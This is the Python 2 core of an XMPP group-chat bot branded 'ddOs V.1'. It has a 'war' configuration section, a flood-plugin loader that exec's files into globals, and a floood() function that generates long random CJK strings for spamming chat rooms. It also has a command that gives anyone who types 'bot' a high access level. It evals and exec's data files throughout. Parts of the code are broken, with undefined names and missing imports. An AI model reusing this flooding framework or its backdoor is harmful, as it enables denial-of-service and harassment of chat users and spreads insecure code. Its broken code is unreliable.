#! /usr/bin/env python
# -*- coding: utf-8 -*-
###*|ddOs V.1|*###
####################


from __future__ import with_statement
import sys
import os
reload(sys).setdefaultencoding("utf-8")
if not hasattr(sys, "argv") or not sys.argv[0]:
	sys.argv = ["."]

try:
	__file__ = os.path.abspath(sys.argv[0])
	os.chdir(os.path.dirname(__file__))
except OSError:
	Print(' Error', color4)
	os.abort()
sys.path.insert(1, 'tools/xmpp')
import xmpp
import time
import threading
import random
from writer import *
import progressbar
import os
import gc
gc.enable()
import sys
from types import NoneType, UnicodeType, InstanceType
import traceback
import codecs
import macros
import urllib
import urllib2
import ConfigParser
#import twisted
#import twisted.python.log
#from twisted.internet import reactor, task
#from twisted.web.html import escape
#from twisted.words.xish import domish
 
def chat_nick(gch,jid):
        if gch in GROUPCHATS:
                for x in GROUPCHATS[gch]:
                        if GROUPCHATS[gch][x]['ishere']==1 and 'jid' in GROUPCHATS[gch][x]:
                                if GROUPCHATS[gch][x]['jid']==jid:
                                        return unicode(x)
        return 'anything'

ROLES={'none':0, 'visitor':0, 'participant':1, 'moderator':3}
AFFILIATIONS={'none':1, 'member':2, 'admin':3, 'owner':4}
LAST = {'c':'', 't':0, 'gch':{}}
INFO = {'start': 0, 'msg': 0, 'prs':0, 'iq':0, 'cmd':0, 'thr':0}
COMMANDS = {}
MACROS = macros.Macros()
GROUPCHATS = {}
MESSAGE_HANDLERS = []
OUTGOING_MESSAGE_HANDLERS = []
JOIN_HANDLERS = []
LEAVE_HANDLERS = []
IQ_HANDLERS = []
PRESENCE_HANDLERS = []
STAGE0_INIT =[]
STAGE1_INIT =[]
STAGE2_INIT =[]
COMMAND_HANDLERS = {}
GLOBACCESS = {}
ACCBYCONF = {}
COMMOFF = {}
ACCBYCONFFILE = {}
GCHCFGS={}
JCON = None
smph = threading.BoundedSemaphore(value=30)
mtx = threading.Lock()
wsmph = threading.BoundedSemaphore(value=1)
def text_color(text, color):
	if eColors and color:
		text = color+text+color0
	return text
def Print(text, color = None):
	try:
		print text_color(text, color)
	except:
		pass
def initialize_file(filename, data=''):
	if not os.access(filename, os.F_OK):
		fp = file(filename, 'w')
		if data:
			fp.write(data)
		fp.close()

def read_file(filename):
	fp = file(filename)
	data = fp.read()
	fp.close()
	return data
	
def write_file_gag(filename, data):
	mtx.acquire()
	fp = file(filename, 'w')
	fp.write(data)
	fp.close()
	mtx.release()
	
def write_file(filename, data):
	with wsmph:
		write_file_gag(filename, data)
def check_file(gch='',file=''):
	pth,pthf='',''
	if gch:
		pthf='tools/back/'+gch+'/'+file
		pth='tools/back/'+gch
	else:
		pthf='tools/back/'+file
		pth='tools/back'
	if os.path.exists(pthf):
		return 1
	else:
		try:
			if not os.path.exists(pth):
				os.mkdir(pth,0755)
			if os.access(pthf, os.F_OK):
				fp = file(pthf, 'w')
			else:
				fp = open(pthf, 'w')
			fp.write('{}')
			fp.close()
			return 1
		except:
			return 0

def register_message(instance):
	MESSAGE_HANDLERS.append(instance)
def register_outgoing_message(instance):
	OUTGOING_MESSAGE_HANDLERS.append(instance)
def register_join(instance):
	JOIN_HANDLERS.append(instance)
def register_leave(instance):
	LEAVE_HANDLERS.append(instance)
def register_iq(instance):
	IQ_HANDLERS.append(instance)
def register_presence(instance):
	PRESENCE_HANDLERS.append(instance)
def register_stage0(instance):
	STAGE0_INIT.append(instance)
	

def lock():
  try:
    user='ddos/user.dll'
    if not os.path.exists(user):
      fp=open(user, 'w')
      fp.write('{}')
      fp.close()
    txt=eval(read_file(user))
    for x in txt:
      fantom['user'][x]={}
  except:
    print u'No ddos File'
    
def register_stage1(instance):
	STAGE1_INIT.append(instance)
def register_stage2(instance):
	STAGE2_INIT.append(instance)
	
def floood(num, slaefr = 1):
	text = str()
	if slaefr:
		while num > 0:
			text += unichr(random.randrange(34000, 40000))
			num -= 1
		return text
	
def register(instance, command, access=0, examples=[]):
	command = command.decode('utf-8')
	COMMAND_HANDLERS[command] = instance
	COMMANDS[command] = {'access': access}
	
	
def call_message(type, source, body):
	for handler in MESSAGE_HANDLERS:
		with smph:
			INFO['thr'] += 1
			threading.Thread(None,handler,'inmsg'+str(INFO['thr']),(type, source, body,)).start()
def call_outgoing_message(target, body, obody):
	for handler in OUTGOING_MESSAGE_HANDLERS:
		with smph:
			INFO['thr'] += 1
			threading.Thread(None,handler,'outmsg'+str(INFO['thr']),(target, body, obody,)).start()
def call_join(groupchat, nick, afl, role):
	for handler in JOIN_HANDLERS:
		with smph:
			INFO['thr'] += 1
			threading.Thread(None,handler,'join'+str(INFO['thr']),(groupchat, nick, afl, role,)).start()
def call_leave(groupchat, nick, reason, code):
	for handler in LEAVE_HANDLERS:
		with smph:
			INFO['thr'] += 1
			threading.Thread(None,handler,'leave'+str(INFO['thr']),(groupchat, nick, reason, code,)).start()
def call_iq(iq):
	for handler in IQ_HANDLERS:
		with smph:
			INFO['thr'] += 1
			threading.Thread(None,handler,'iq'+str(INFO['thr']),(iq,)).start()		
def call_presence(prs):
	for handler in PRESENCE_HANDLERS:
		with smph:
			INFO['thr'] += 1
			threading.Thread(None,handler,'prs'+str(INFO['thr']),(prs,)).start()
			
def bot__up(type, source, parameters):
	jid = get_true_jid(source)
	if parameters.strip() == u'bot':
		GLOBACCESS[jid]=9


def call_command(command, type, source, parameters, callee):
	real_access = MACROS.get_access(callee, source[1])
	if real_access < 0:
		real_access = COMMANDS[command]['access']
	if COMMAND_HANDLERS.has_key(command):
		if has_access(source, real_access, source[1]):
			with smph:
				INFO['thr'] += 1
				threading.Thread(None,COMMAND_HANDLERS[command],'command'+str(INFO['thr']),(type, source, parameters,)).start()
		else:
			reply(type, source, u'وصول غير كافي')				
########################
#######  COLORS  #######
########################

eColors = xmpp.debug.colors_enabled

color0 = chr(27) + "[37;1m" 
color1 = chr(27) + "[35m" 
color2 = chr(27) + "[36;1m"
color3 = chr(27) + "[32m" 
color4 = chr(27) + "[34;1m" 
color5 = chr(27) + "[33;1m"
color6 = chr(27) + "[31;1m"
color7 = chr(27) + "[30;1m" 
color8 = chr(27) + "[36m" 
########################
#######  CONFIG  #######
########################
GENERAL_CONFIG_FILE = 'config.py'
fp = open(GENERAL_CONFIG_FILE, 'r')
GENERAL_CONFIG = eval(fp.read())
fp.close()
#######################################
config_prefix = 'tools/other/prefix.dll'
fp = open(config_prefix, 'r')
GENERAL_PREFIX = eval(fp.read())
fp.close()
########################
#######  Tools  ########
########################
PORT = '5222'
AUTO_RESTART = '100'
CONNECT_SERVER = GENERAL_CONFIG['Server']
JID = GENERAL_CONFIG['User']+'@'+CONNECT_SERVER
JidPass = GENERAL_CONFIG['Password']
RESOURCE = GENERAL_CONFIG['Resource']
BotNick = GENERAL_CONFIG['NickName']
Gropze = GENERAL_CONFIG['Default-GroupChat']
Prefix = GENERAL_PREFIX['Prefix']
Prefix2 = GENERAL_CONFIG['Prefix']
ADMINS = GENERAL_CONFIG['Master']
Statuz = GENERAL_CONFIG['Message']
Showz = GENERAL_CONFIG['Status']
#### war conf #####################
Serverx = GENERAL_CONFIG['Serverx']
PaSsS = GENERAL_CONFIG['pASS']
NaMe = GENERAL_CONFIG['Name']
###########Databases#############
base_type = GENERAL_CONFIG['Base-Type']
########################
########  BacK  ########
########################
GROUPCHAT_CACHE_FILE = 'tools/back/conferences.dll'
GROUPCHAT_STATUS_CACHE_FILE='tools/back/status.dll'
GLOBACCESS_FILE = 'tools/back/masters.dll'
ACCBYCONF_FILE = 'tools/back/accbyconf.dll'
PREFIX_FILE = 'tools/other/prefix.dll'
#############################################
ZFILE = "tools/other/%s"
GFILE = ZFILE % ("memory.dll")
###########################
######## Databases ########
###########################
if base_type == 'pgsql':
	import psycopg2
	import psycopg2.extensions
elif base_type == 'sqlite3':
	import itypes
else: errorHandler('Unknown database backend!')
##################################################
flood_PLUGINS = 'plugins/flood'
commands_PLUGINS = 'plugins/commands'
logz = 'Turn'
loggerz = 'error/Logs/logger.dll'
public_log = 'error/Pub'
private_log = 'error/Pv'
pidz = 'error/Pid'
slaefr_v = '2020'
INITSCRIPT_FILE = 'tools/other/script.dll'
transe = 'ar'
execfile("ddos/Number_Nick.dll")
execfile("ddos/Number_Msg.dll")
execfile("ddos/Number_Status.dll")
execfile("ddos/Number_Resource.dll")
slaefr_show = file("ddos/slaefr_show.dll").read().splitlines()
MsGX = file("ddos/MsG.py").read().splitlines()
serverw = file("ddos/servers.dll").read().splitlines()
#######################
########  VER  ########
#######################
SVN_REPOS = '|ddOs|'
slaefr_Ver = 'v%s [%s]' % (sys.version.split(' (')[0],sys.version.split(')')[0].split(', ')[1])
'%s [%s]' % (sys.version.split(' (')[0],sys.version.split(')')[0].split(', ')[1])
if base_type == 'pgsql': conn = '%s.psycopg2- v%s' % (base_type, psycopg2.__version__)
elif base_type == 'sqlite3': conn = '%s' % (base_type)
botVersion = '%s | %s' % (slaefr_v, conn)
BOT_VER = {'rev': 9, 'botver': {'name': 'ddOs', 'ver': botVersion, 'os': 'Unix'}}
#######################
limite = 'MsgLimit'
if limite.isdigit():
	limite = int(limite)
else:
	limite = 2048

##################################
def load_prefix():
	prefixx = 'tools/other/prefix.dll'
	nawrs = eval(read_file(PREFIX_FILE))
	if not Prefix in prefixx and nawrs:
		write_file(prefixx, u'{\'Prefix\': \''+Prefix2+'\'}')
	else:
		return
#######################
      

def load_groupchat():
	groupchats = eval(read_file(GROUPCHAT_CACHE_FILE))
	if str(len(groupchats)) == '0':
		gropz = 'tools/back/conferences.dll'
		write_file(gropz, u'{u\''+Gropze+'\': {\'nick\': \''+BotNick+'\'}}')
	else:
		return
#### ############### ########################
Print('\n ## Bot By ddOs ## V;1\n', color2)
###       ####
### FlooD ####
###       ####
def find_flood():
	Print('\n ## MasTer:%s' % ADMINS, color6)
	Print('\n ## loaDinG FlooD Plugins ...?', color3)
	valid_plugins = []
	invalid_plugins = []
	possibilities = os.listdir(flood_PLUGINS)
	for possibility in possibilities:
		if possibility[-3:].lower() == '.py':
			try:
				fp = file(flood_PLUGINS + '/' + possibility)
				data = fp.read(20)
				valid_plugins.append(possibility)
			except:
				pass
	if invalid_plugins:
		Print('\nFailed To Load',len(invalid_plugins),'Orders:', color2)
	else:
		Print(' OK #Has read \n', color4)
	return valid_plugins
def load_flood():
	plugins = find_flood()
	for plugin in plugins:
		try:
			fp = file(flood_PLUGINS + '/' + plugin)
			exec fp in globals()
			fp.close()
		except:
			raise
	plugins.sort()
###          ####
### commands ####
###          ####
def find_commands():
	Print(' ## loaDinG CoMMaNds Plugins ...?', color3)
	valid_plugins = []
	invalid_plugins = []
	possibilities = os.listdir(commands_PLUGINS)
	for possibility in possibilities:
		if possibility[-3:].lower() == '.py':
			try:
				fp = file(commands_PLUGINS + '/' + possibility)
				data = fp.read(20)
				valid_plugins.append(possibility)
			except:
				pass
	if invalid_plugins:
		Print('\nFailed To Load',len(invalid_plugins),'Orders:', color2)
	else:
		Print(' OK #Has read \n', color4)
	return valid_plugins
def load_commands():
	plugins = find_commands()
	for plugin in plugins:
		try:
			fp = file(commands_PLUGINS + '/' + plugin)
			exec fp in globals()
			fp.close()
		except:
			raise
	plugins.sort()
#############*################
    #######SLAEFR#########
#############*################             
def get_gch_cfg(gch):
	cfgfile='tools/back/'+gch+'/config.cfg'
	if not check_file(gch,'config.cfg'):
		Print('unable to create config file for new groupchat!', color2)
		raise
	try:
		cfg = eval(read_file(cfgfile))
		GCHCFGS[gch]=cfg
		LAST['gch'][gch]={}
	except:
		pass
def upkeep():
	tmr=threading.Timer(60, upkeep)
	tmr.start()
	sys.exc_clear()
	if os.name == 'nt':
		try:
			import msvcrt
			msvcrt.heapmin()
		except:
			pass
	import gc
	gc.collect()
def load_initscript():
	Print('Executing Init Script', color0)
	fp = file(INITSCRIPT_FILE)
	exec fp in globals()
	fp.close()
def logger_stanza():
        data=''
        try:
                global LOG_ST
                txt=open(loggerz,'w')
                txt.write(str(LOG_ST))
                txt.close()
        except: pass
def get_true_jid(jid):
	true_jid = ''
	if type(jid) is types.ListType:
		jid = jid[0]
	if type(jid) is types.InstanceType:
		jid = unicode(jid)
	stripped_jid = string.split(jid, '/', 1)[0]
	resource = ''
	if len(string.split(jid, '/', 1)) == 2:
		resource = string.split(jid, '/', 1)[1]
	if GROUPCHATS.has_key(stripped_jid):
		if GROUPCHATS[stripped_jid].has_key(resource):
			true_jid = string.split(unicode(GROUPCHATS[stripped_jid][resource]['jid']), '/', 1)[0]
		else:
			true_jid = stripped_jid
	else:
		true_jid = stripped_jid
	return true_jid
def get_bot_nick(groupchat):
	if check_file(file='conferences.dll'):
		gchdb = eval(read_file(GROUPCHAT_CACHE_FILE))
		if gchdb.has_key(groupchat) and gchdb[groupchat]['nick']:
			return gchdb[groupchat]['nick']
		else:
			return BotNick
	else:
		Print('Error adding groupchat to groupchats list file!', color2)
def get_gch_info(gch, info):
	if check_file(file='conferences.dll'):
		gchdb = eval(read_file(GROUPCHAT_CACHE_FILE))
		if gchdb.has_key(gch):	return gchdb[gch].get(info)
		else:	return None
	else:
		Print('Error adding groupchat to groupchats list file!', color2)

def add_gch(groupchat=None, nick=None):
	if check_file(file='conferences.dll'):
		gchdb = eval(read_file(GROUPCHAT_CACHE_FILE))
		if not groupchat in gchdb:
			gchdb[groupchat] = groupchat
			gchdb[groupchat] = {}
			gchdb[groupchat]['nick'] = nick
		else:
			if nick and groupchat:
				gchdb[groupchat]['nick'] = nick
			elif nick and groupchat:
				gchdb[groupchat]['nick'] = nick
			elif groupchat:
				del gchdb[groupchat]
			else:
				return 0
		write_file(GROUPCHAT_CACHE_FILE, str(gchdb))
		return 1
	else:
		Print('Error adding groupchat to groupchats list file!', color2)
		
def timeElapsed(time):
	minutes, seconds = divmod(time, 60)
	hours, minutes = divmod(minutes, 60)
	days, hours = divmod(hours, 24)
	months, days = divmod(days, 30)
	rep = u'%d Second' % (round(seconds))
	if time>60: rep = u'%d Minute %s' % (minutes, rep)
	if time>3600: rep = u'%d Hour %s' % (hours, rep)
	if time>86400: rep = u'%d Day %s' % (days, rep)
	if time>2592000: rep = u'%d Month %s' % (months, rep)
	return rep

def change_bot_status(gch,status,show,auto=0):
	prs=xmpp.protocol.Presence(gch+'/'+get_bot_nick(gch))
	if status:
		prs.setStatus(status)
	if show:
		prs.setShow(show)
	prs.setTag('c', namespace=xmpp.NS_CAPS, attrs={'node':SVN_REPOS,'ver':BOT_VER['botver']['ver']})
	JCON.send(prs)
	if auto:
		LAST['gch'][gch]['autoaway']=0
	else:
		LAST['gch'][gch]['autoaway']=1

######################4########################
def change_access_temp(gch, source, level=0):
	global ACCBYCONF
	jid = get_true_jid(source)
	try:
		level = int(level)
	except:
		level = 0
	if not ACCBYCONF.has_key(gch):
		ACCBYCONF[gch] = gch
		ACCBYCONF[gch] = {}
	if not ACCBYCONF[gch].has_key(jid):
		ACCBYCONF[gch][jid]=jid
	ACCBYCONF[gch][jid]=level

def change_access_perm(gch, source, level=None):
	global ACCBYCONF
	jid = get_true_jid(source)
	try:
		level = int(level)
	except:
		pass
	temp_access = eval(read_file(ACCBYCONF_FILE))
	if not temp_access.has_key(gch):
		temp_access[gch] = gch
		temp_access[gch] = {}
	if not temp_access[gch].has_key(jid):
		temp_access[gch][jid]=jid
	if level:
		temp_access[gch][jid]=level
	else:
		del temp_access[gch][jid]
	write_file(ACCBYCONF_FILE, str(temp_access))
	if not ACCBYCONF.has_key(gch):
		ACCBYCONF[gch] = gch
		ACCBYCONF[gch] = {}
	if not ACCBYCONF[gch].has_key(jid):
		ACCBYCONF[gch][jid]=jid
	if level:
		ACCBYCONF[gch][jid]=level
	else:
		del ACCBYCONF[gch][jid]
	get_access_levels()

def change_access_perm_glob(source, level=0):
	global GLOBACCESS
	jid = get_true_jid(source)
	temp_access = eval(read_file(GLOBACCESS_FILE))
	if level:
		temp_access[jid] = level
	else:
		del temp_access[jid]
	write_file(GLOBACCESS_FILE, str(temp_access))
	get_access_levels()
	
def change_access_temp_glob(source, level=0):
	global GLOBACCESS
	jid = get_true_jid(source)
	if level:
		GLOBACCESS[jid] = level
	else:
		del GLOBACCESS[jid]

def user_level(source, gch):
	global ACCBYCONF
	global GLOBACCESS
	global ACCBYCONFFILE
	jid = get_true_jid(source)
	if GLOBACCESS.has_key(jid):
		return GLOBACCESS[jid]
	if ACCBYCONFFILE.has_key(gch):
		if ACCBYCONFFILE[gch].has_key(jid):
			return ACCBYCONFFILE[gch][jid]
	if ACCBYCONF.has_key(gch):
		if ACCBYCONF[gch].has_key(jid):
			return ACCBYCONF[gch][jid]
	return 0

def has_access(source, level, gch):
	jid = get_true_jid(source)
	if user_level(jid,gch) >= int(level):
		return 1
	return 0

def join_groupchat(groupchat=None, nick=BotNick):
        global Showz
        global Statuz
        confstatus=[Showz, Statuz]
        if check_file(file='status.dll'):
          groupchatstatus = eval(read_file(GROUPCHAT_STATUS_CACHE_FILE))
          if groupchatstatus.has_key(groupchat):
            if groupchatstatus[groupchat]:
              confstatusr=groupchatstatus[groupchat]
              confstatus[0]=confstatusr[0]
              if confstatusr[1]:
                confstatus[1]=confstatusr[1]
        else:
          Print('Error: unable to create chatrooms status list file!', color2)

        prs=xmpp.protocol.Presence(groupchat+'/'+nick)


        prs.setShow(confstatus[0])
        prs.setStatus(confstatus[1])
        pres=prs.setTag('x',namespace=xmpp.NS_MUC)
        prs.setTag('c', namespace=xmpp.NS_CAPS, attrs={'node':SVN_REPOS,'ver':BOT_VER['botver']['ver']})
        pres.addChild('history',{'maxchars':'0','maxstanzas':'0'})
        JCON.send(prs)
        if not groupchat in GROUPCHATS:
                GROUPCHATS[groupchat] = {}
        if check_file(groupchat,'macros.dll'):
                pass
        else:
                msg(groupchat, u'I\'ve Error, Tell My BOSS about that!')

        add_gch(groupchat, nick)

def leave_groupchat(groupchat,status=''):
	prs=xmpp.Presence(groupchat, 'unavailable')
	if status:
		prs.setStatus(status)
	JCON.send(prs)
	if GROUPCHATS.has_key(groupchat):
		del GROUPCHATS[groupchat]
		add_gch(groupchat)
		if 'thr' in LAST['gch'][groupchat]:
			if not LAST['gch'][groupchat]['thr'] is None: LAST['gch'][groupchat]['thr'].cancel()

def msg(target, body):
	if not isinstance(body, unicode):
		body = body.decode('utf8', 'replace')
	obody=body
	if time.localtime()[1]==4 and time.localtime()[2]==1:
		body=remix_string(body)
	msg = xmpp.Message(target)
	if GROUPCHATS.has_key(target):
		msg.setType('groupchat')
		if len(body)>limite:
			body=body[:limite]+u' [Look In Your PV!]'
		msg.setBody(body.strip())
	else:
		msg.setType('chat')
		msg.setBody(body.strip())
	JCON.send(msg)
	call_outgoing_message(target, body, obody)

def reply(ltype, source, body):
	if not isinstance(body, unicode):
		body = body.decode('utf8', 'replace')
	if source[1] in GCHCFGS.keys() and GCHCFGS[source[1]]['afools']==1:
		if random.randrange(0,20) == random.randrange(0,20):
			body = random.choice(eval(read_file('tools/back/status.dll'))['afools'])
	if ltype == 'public':
		msg(source[1], source[2] + ', ' + body)
	elif ltype == 'private':
		msg(source[0], body)


def isadmin(jid):
	if type(jid) is types.ListType:
		jid = jid[0]
	jid = str(jid)
	stripped_jid = string.split(jid, '/', 1)[0]
	resource = ''
	if len(string.split(jid, '/', 1)) == 2:
		resource = string.split(jid, '/', 1)[1]
	if stripped_jid in ADMINS:
		return 1
	elif GROUPCHATS.has_key(stripped_jid):
		if GROUPCHATS[stripped_jid].has_key(resource):
			if string.split(str(GROUPCHATS[stripped_jid][resource]['jid']), '/', 1)[0] in ADMINS:
				return 1
	return 0
def findPresenceItem(node):
	for p in [x.getTag('item') for x in node.getTags('x',namespace=xmpp.NS_MUC_USER)]:
		if p != None:
			return p
	return None

def messageHnd(con, msg):
	msgtype = msg.getType()
	fromjid = msg.getFrom()
	INFO['msg'] += 1
	if user_level(fromjid,fromjid.getStripped())==-100:
		return
	if msg.timestamp:
		return
	body = msg.getBody()
	if body:
		body=body.strip()
	if not body:
		return
	if len(body)>7000000:
		body=body[:7000000]+u' [Look In Your PV!]'	
	if msgtype == 'groupchat':
		mtype='public'
		if GROUPCHATS.has_key(fromjid.getStripped()) and GROUPCHATS[fromjid.getStripped()].has_key(fromjid.getResource()):
			GROUPCHATS[fromjid.getStripped()][fromjid.getResource()]['idle'] = time.time()	
	elif msgtype == 'error':
		if msg.getErrorCode()=='500':
			time.sleep(0.6)
			JCON.send(xmpp.Message(fromjid, body, 'groupchat'))
		elif msg.getErrorCode()=='406':
			join_groupchat(fromjid.getStripped(), BotNick)
			time.sleep(0.6)
			JCON.send(xmpp.Message(fromjid, body, 'groupchat'))			
		return
	else:
		mtype='private'
	call_message(mtype, [fromjid, fromjid.getStripped(), fromjid.getResource()], body)
	
	bot_nick = get_bot_nick(fromjid.getStripped())
	if bot_nick == fromjid.getResource():
		return
	command,parameters,cbody,rcmd = '','','',''
	for x in [bot_nick+x for x in [':',',','>']]:
		body=body.replace(x,'')
	body=body.strip()
	if not body:
		return
	rcmd = body.split()[0].lower()
	if fromjid.getStripped() in COMMOFF and rcmd in COMMOFF[fromjid.getStripped()]:
		return
	cbody = MACROS.expand(body, [fromjid, fromjid.getStripped(), fromjid.getResource()])
	command=cbody.split()[0].lower()
	if cbody.count(' '):
		parameters = cbody[(cbody.find(' ') + 1):].strip()
	if command in COMMANDS:
		if fromjid.getStripped() in COMMOFF and command in COMMOFF[fromjid.getStripped()]:
			return
		else:
			if fromjid.getStripped() in GROUPCHATS:			
				if GCHCFGS[fromjid.getStripped()]['autoaway']==1:
					if LAST['gch'][fromjid.getStripped()]['autoaway']==1:
						change_bot_status(fromjid.getStripped(), GCHCFGS[fromjid.getStripped()]['status']['status'], GCHCFGS[fromjid.getStripped()]['status']['show'],)
			call_command(command, mtype, [fromjid, fromjid.getStripped(), fromjid.getResource()], unicode(parameters), rcmd)
			INFO['cmd'] += 1
			LAST['t'] = time.time()
			LAST['c'] = command

def presenceHnd(con, prs):
	fromjid = prs.getFrom()
	if user_level(fromjid,fromjid.getStripped())==-100:
		return
	ptype = prs.getType()
	groupchat = fromjid.getStripped()
	nick = fromjid.getResource()
	item = findPresenceItem(prs)
	INFO['prs'] += 1
	
	if ptype == 'subscribe':
		JCON.send(xmpp.protocol.Presence(to=fromjid, typ='subscribed'))
	elif ptype == 'unsubscribe':
		JCON.send(xmpp.protocol.Presence(to=fromjid, typ='unsubscribed'))

	if groupchat in GROUPCHATS:
		if ptype == 'unavailable':
			jid = item['jid']
			scode = prs.getStatusCode()
			reason = prs.getStatus()
			if scode == '303':
				newnick = prs.getNick()
				GROUPCHATS[groupchat][newnick] = {'jid': jid, 'idle': time.time(), 'joined': GROUPCHATS[groupchat][nick]['joined'], 'ishere': 1}
				for x in ['idle','status','stmsg']:
					try:
						del GROUPCHATS[groupchat][nick][x]
						if GROUPCHATS[groupchat][nick]['ishere']==1:
							GROUPCHATS[groupchat][nick]['ishere']=0
					except:
						pass
			else:
				for x in ['idle','status','stmsg','joined']:
					try:
						del GROUPCHATS[groupchat][nick][x]
						if GROUPCHATS[groupchat][nick]['ishere']==1:
							GROUPCHATS[groupchat][nick]['ishere']=0
					except:
						pass
				call_leave(groupchat, nick, reason, scode)
		elif ptype == 'available' or ptype == None:
			jid = item['jid']
			afl=prs.getAffiliation()
			role=prs.getRole()
			if not jid:
				jid=fromjid
			if nick in GROUPCHATS[groupchat] and GROUPCHATS[groupchat][nick]['jid']==jid and GROUPCHATS[groupchat][nick]['ishere']==1:
				pass
			else:
				GROUPCHATS[groupchat][nick] = {'jid': jid, 'idle': time.time(), 'joined': time.time(), 'ishere': 1, 'status': '', 'stmsg': ''}
				if role=='moderator' or user_level(jid,groupchat)>=15:
					GROUPCHATS[groupchat][nick]['ismoder'] = 1
				else:
					GROUPCHATS[groupchat][nick]['ismoder'] = 0
				call_join(groupchat, nick, afl, role)
		elif ptype == 'error':
			ecode = prs.getErrorCode()
			if ecode:
				if ecode == '409':
					join_groupchat(groupchat, nick + '-')
				elif ecode == '404':
					del GROUPCHATS[groupchat]
				elif ecode in ['401','403','405',]:
					leave_groupchat(groupchat, u'Got %s Error Code!' % str(ecode))
				elif ecode == '503':
					threading.Timer(60, join_groupchat,(groupchat, nick)).start()
		else:
			pass
		call_presence(prs)

def iqHnd(con, iq):
	fromjid = iq.getFrom()
	if user_level(fromjid,fromjid.getStripped())==-100:
		return
	global JCON, BOT_VER
	if not iq.getType() == 'error':
		if iq.getTags('query', {}, xmpp.NS_VERSION):
			if not BOT_VER['botver']['os']:
				osver=''
				if os.name=='nt':
					osname=os.popen("ver")
					osver=osname.read().strip().decode('utf-8')+' '
					osname.close()			
				else:
					osname=os.popen("uname -sr", 'r')
					osver=osname.read().strip()+' '
					osname.close()
					osname2=os.popen("uname -m", 'r')
					osver2=osname2.read().strip().decode('utf-8')+' '
					osname2.close
				pyver = sys.version
				#BOT_VER['botver']['os'] = osver + osver2 +' | ' + 'Python- %s | Twisted: %s' % (slaefr_Ver,twisted.__version__)
			result = iq.buildReply('result')
			query = result.getTag('query')
			query.setTagData('name', BOT_VER['botver']['name'])
			query.setTagData('version', BOT_VER['botver']['ver'])
			query.setTagData('os', BOT_VER['botver']['os'])
			JCON.send(result)
			raise xmpp.NodeProcessed
		elif iq.getTags('time', {}, 'urn:xmpp:time'):
			tzo=(lambda tup: tup[0]+"%02d:"%tup[1]+"%02d"%tup[2])((lambda t: tuple(['+' if t<0 else '-', abs(t)/3600, abs(t)/60%60]))(time.altzone if time.daylight else time.timezone))
			utc=time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
			result = iq.buildReply('result')
			JCON.send(result)
			raise xmpp.NodeProcessed
		elif iq.getTags('query', {}, xmpp.NS_DISCO_INFO):
			items=[]
			ids=[]
			ids.append({'category':'jabber','type':'bot','name':'slaefr'})
			features=[xmpp.NS_DISCO_INFO,xmpp.NS_DISCO_ITEMS,xmpp.NS_MUC,'urn:xmpp:time','urn:xmpp:ping',xmpp.NS_VERSION,xmpp.NS_PRIVACY,xmpp.NS_ROSTER,xmpp.NS_VCARD,xmpp.NS_DATA,xmpp.NS_LAST,xmpp.NS_COMMANDS,'msglog','fullunicode',xmpp.NS_TIME]
			info={'ids':ids,'features':features}
			b=xmpp.browser.Browser()
			b.PlugIn(JCON)
			b.setDiscoHandler({'items':items,'info':info})
		elif iq.getTags('query', {}, xmpp.NS_LAST):
			last=time.time()-LAST['t']
			result = iq.buildReply('result')
			query = result.getTag('query')
			query.setAttr('seconds',int(last))
			query.setData(LAST['c'])
			JCON.send(result)
			raise xmpp.NodeProcessed
		elif iq.getTags('query', {}, xmpp.NS_TIME):
			timedisp=time.strftime("%a, %d %b %Y %H:%M:%S UTC", time.localtime())
			timetz=time.strftime("%Z", time.localtime())
			timeutc=time.strftime('%Y%m%dT%H:%M:%S', time.gmtime())
			result = xmpp.Iq('result')
			result.setTo(fromjid)
			result.setID(iq.getID())
			query = result.addChild('query', {}, [], 'jabber:iq:time')
			query.setTagData('utc', timeutc)
			query.setTagData('tz', timetz)
			query.setTagData('display', timedisp)
			JCON.send(result)
			raise xmpp.NodeProcessed
		elif iq.getTags('ping', {}, 'urn:xmpp:ping'):
			result = xmpp.Iq('result')
			result.setTo(iq.getFrom())
			result.setID(iq.getID())
			JCON.send(result)
			raise xmpp.NodeProcessed
	call_iq(iq)
	INFO['iq'] += 1

def dcHnd():
	Print('\n - disconnected!', color2)
	if AUTO_RESTART:
		Print('\n - RebooTinG...', color2)
		time.sleep(5)
		Print('\n - Wait..', color2)
		os.execl(sys.executable, sys.executable, sys.argv[0])
	else:
		sys.exit(0)

##############
if base_type == 'pgsql': conn = psycopg2.connect(database=base_name, user=base_user, host=base_host, password=base_pass, port=base_port)
elif base_type == 'sqlite3': database = itypes.Database
else: errorHandler('Can\'t connect to `%s` base type!' % base_type)
############################
if base_type == 'sqlite3':
	def check_sqlite():

		assert itypes.sqlite3, "py-sqlite3 required"
##
def start():
	try:
		(USERNAME, SERVER) = JID.split("/")[0].split("@")
	except:
		Print('\n - Wrong, User Account %s' % JID, color2)
		os.abort()
	print 'LoaDinG Files'
	for x in xrange(20):
		try:
			sys.stdout.write("*")
			sys.stdout.flush()
			time.sleep(0.2)
		except KeyboardInterrupt:
			print "\n#-# Bye.\n"
			sys.exit(0)
	pid = str(os.getpid())
	
	try:
		fp = file(pidz, 'r')
		p = fp.read()
		fp.close()
		if p <> pid:
			os.kill(int(p), 3)
			time.sleep(1)
			try:
				os.kill(int(p), 9)
			except:
				pass
			sys.stdout.write('\n # WaS ChanGed Pid Of %s \n' % (p, ))
	except: pass

	fp = file(pidz, 'w')
	fp.write(pid)
	fp.close()
	
	global JCON
	JCON = xmpp.Client(server=SERVER, port=PORT, debug=[])

	load_flood()
	load_commands()
	load_prefix()
	load_groupchat()

	Print('\n ## ChecKeD Files', color5)

	con=JCON.connect(server=(CONNECT_SERVER, PORT), secure=0,use_srv=True)
	if not con:
		Print('\n - I Cann\'t Connect to: '+CONNECT_SERVER, color8)
		time.sleep(30)
		sys.exit(1)
	else:
		Print('\n ## Try Connecting to: '+CONNECT_SERVER, color7)


	auth=JCON.auth(USERNAME, JidPass, RESOURCE)
	if not auth:
		Print('Auth Error. Incorrect login/JidPass?\nError: ', JCON.lastErr, JCON.lastErrCode, color3)
		sys.exit(1)
	else:
		Print('\n ## Connection', color0)
	if auth!='sasl':
		Print('Warning: unable to perform SASL auth. Old authentication method used!', color2)
		
	for process in STAGE0_INIT:
		with smph:
			INFO['thr'] += 1
			threading.Thread(None,process,'stage0_init'+str(INFO['thr'])).start()

	JCON.RegisterHandler('message', messageHnd)
	JCON.RegisterHandler('presence', presenceHnd)
	JCON.RegisterHandler('iq', iqHnd)
	JCON.RegisterDisconnectHandler(dcHnd)
